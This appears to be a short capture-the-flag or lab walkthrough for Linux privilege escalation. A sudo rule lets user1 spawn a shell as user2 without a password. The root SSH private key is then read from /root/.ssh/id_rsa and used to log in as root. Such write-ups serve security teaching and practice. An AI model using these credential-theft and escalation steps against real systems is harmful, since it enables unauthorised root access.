```ssh
ssh user1@<IP> -p <PORT>
```
### SSH user1
```shell
sudo -l
```
`(user2 : user2) NOPASSWD: /bin/bash`
### Switch to user2
```bash
sudo -u user2 /bin/bash
```
### Copy id_rsa
```bash
cat /root/.ssh/id_rsa
```
### Main Terminal
```bash
vim id_rsa
chmod 600 id_rsa
ssh root@<IP> -p<PORT> -i id_rsa
```

